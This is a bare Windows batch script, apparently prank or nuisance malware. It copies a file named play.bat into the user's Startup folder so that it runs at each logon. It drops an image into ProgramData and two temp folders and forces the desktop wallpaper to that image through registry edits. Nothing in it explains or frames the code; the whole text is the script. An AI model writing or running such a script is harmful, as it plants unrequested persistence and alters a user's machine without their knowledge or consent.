copy play.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy wlpprr.jpg C:\ProgramData\
copy wlpprr.jpg C:\Windows\Temp
copy wlpprr.jpg %userprofile%\AppData\Local\Temp\
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\ProgramData\wlpprr.jpg /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Windows\Temp\wlpprr.jpg /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%userprofile%\AppData\Local\Temp\wlpprr.jpg" /f
